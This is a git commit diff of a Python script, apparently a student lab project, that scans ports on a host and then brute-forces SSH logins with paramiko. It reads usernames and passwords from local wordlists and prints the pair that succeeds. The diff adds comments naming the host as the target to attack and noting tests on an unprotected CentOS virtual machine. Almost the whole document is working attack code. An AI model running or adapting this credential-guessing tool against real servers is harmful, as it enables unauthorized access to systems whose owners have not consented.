126001d0f37cb1e69a09d9e595912a5a18b29334
Mark Sun <404657164@gms.tku.edu.tw>
2017-05-17 03:32:38 +0800

    Update portScan.py

--- portScan.py
+++ portScan.py
@@ -4,11 +4,15 @@ from datetime import datetime
 import os, io
 import paramiko
 
+#` 欲攻擊之目標
 host = '127.0.0.1'
-max_port = 1300
+#` 連接埠掃描範圍
 min_port = 1
+max_port = 1300
+#` opened_port 可有可無吧0.0
 opened_port = []
 
+#` 掃描連接埠工具
 def scan_host(host, port, r_code = 1):
     try:
         s = socket(AF_INET, SOCK_STREAM)
@@ -25,7 +29,10 @@ def scan_host(host, port, r_code = 1):
 
 try:
     host = '127.0.0.1'
-    # host = input("[*] 輸入欲掃瞄之主機: ")
+    #` 用虛擬機測試，假設環境無第三方軟體保護
+    #` Environment:CentOS7
+    #` Port : 1111
+    #` host = input("[*] 輸入欲掃瞄之主機: ")
 except KeyboardInterrupt:
     print("\n\n[*] 取消掃描！")
     print("[*] 程式結束執行！")
@@ -33,7 +40,7 @@ except KeyboardInterrupt:
 
 hostip = gethostbyname(host)
 print("\n[*] Host: %s IP: %s" % (host, hostip))
-print("[*] 掃瞄於 %s...\n" % (time.strftime("%H:%M:%S")))
+print("[*] 掃瞄於： %s...\n" % (time.strftime("%H:%M:%S")))
 start_time = datetime.now()
 
 for port in range(min_port, max_port):
@@ -41,24 +48,25 @@ for port in range(min_port, max_port):
         response = scan_host(host, port)
 
         if response == 0:
-            print("[*] Port %d: Open" % port)
+            print("[*] Port {:5}: Open".format(port))
             opened_port.append(port)
     except Exception as e:
         pass
 
 stop_time = datetime.now()
 totalTimeDuration = stop_time - start_time
-print("\n[*] Scanning Finished At %s ..." % (time.strftime("%H:%M:%S")))
-print("[*] Scanning Duration: %s ..." % totalTimeDuration)
+print("\n[*] 完成時間： %s " % (time.strftime("%H:%M:%S")))
+print("[*] 間隔時間： %s " % totalTimeDuration)
 print("[*] 掃瞄完畢 !")
 time.sleep(2)
 
 #` ---------- 第一階段完成 ----------
+
 import socket
 
-line = "\n-------------------------------------------------------\n"
+line = "\n----------------------------------------------------------------------\n"
 print(line)
-print("[*] 開始猜測帳號與密碼！")
+print("[*] 開始暴力猜測帳號與密碼！")
 
 try:
     userList = '/Users/marksun/Desktop/專題/ssh_user.txt'
@@ -73,13 +81,13 @@ except KeyboardInterrupt:
     print("\n\n[*] 取消動作！")
     sys.exit(2)
 
-def ssh_connect(userName, passWord, code = 0):
+def ssh_connect(userName, passWord,code = 0):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         # 期望
-        for portList in opened_port:
-            ssh.connect(host, username = userName, password = passWord, port = portList, timeout = 10)
+        # for port in opened_port:
+        ssh.connect(host, username = userName, password = passWord, port = 1111, timeout = 10)
         pass
     except paramiko.AuthenticationException:
         #[*] Authentication FAiled ... （猜測失敗）
@@ -105,11 +113,11 @@ try:
                     _password = _password.strip('\n')
                     response = ssh_connect(_user, _password)
                     if response == 0:
-                        print("%s[*] User: %s [*] Password: %s%s" % (line, _user, _password, line))
-                        # continue
+                        print("%s[*] User: %s [*] Password: %s%s" % (line[1:], _user, _password, line))
+                        print("[*] 猜中密碼！")
                         sys.exit(0)
                     elif response == 1:
-                        print("[*] User: %s [*] Password: %s [ Login Incorrect ] " % (_user, _password))
+                        print("[*] User: {} [*] Password: {:20} [ Login Incorrect ] ".format(_user, _password))
                     elif response == 2:
                         print("[*] Connection Could Not Be Established To Address: %s" % host)
                         # continue
